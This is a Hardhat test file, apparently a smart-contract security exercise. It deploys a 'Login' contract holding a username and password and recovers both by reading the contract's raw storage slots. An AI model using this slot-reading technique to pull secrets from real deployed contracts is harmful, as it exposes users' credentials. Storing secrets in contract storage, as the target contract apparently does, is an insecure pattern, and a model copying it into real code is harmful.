const {ethers} = require("hardhat");

const{expect} = require("chai");

describe("Attack", function(){
    it("should be able to read usrname and passwd", async function(){

        const loginFactory = await ethers.getContractFactory("Login");

        const usrBytes = ethers.utils.formatBytes32String("test");
        const passwdBytes = ethers.utils.formatBytes32String("passwd");

        const loginContract = await loginFactory.deploy(usrBytes,passwdBytes);

        await loginContract.deployed();

        const slot0Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            0
        );

        const slot1Bytes = await ethers.provider.getStorageAt(
            loginContract.address,
            1
        );

        expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
        expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("passwd");
    })
})